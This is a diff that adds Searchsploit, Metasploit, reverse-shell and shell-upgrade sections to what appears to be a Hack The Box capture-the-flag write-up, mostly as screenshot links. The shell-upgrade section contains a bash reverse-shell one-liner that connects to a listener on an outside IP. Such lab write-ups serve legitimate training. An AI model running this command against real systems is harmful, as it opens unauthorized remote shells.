@@ -116,3 +116,18 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 # Error Page
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ad4c8c30-b309-41a8-93c7-da658733df47)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/dd0a38a4-f0d6-40e1-b913-857e2cd68eff)
+# Searchsploit
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/179e8926-8ed4-442b-9ffc-ddfd004b63d4)
+# Metasploit
+```CSS
+▶ sudo msfdb run
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/cac2a074-606e-4cf1-a32b-6d73255d6e8f)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ee9ba94e-1287-4ea6-a4d1-573b14348e51)
+# Reverse Shell
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a0470a49-5b21-4d54-92bf-ed1723809e95)
+# Shell Upgrade
+```CSS
+bash -c 'bash -i >& /dev/tcp/10.10.14.85/9001 0>&1'
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2a984763-6024-4ff5-b6f8-f37a64b505f7)
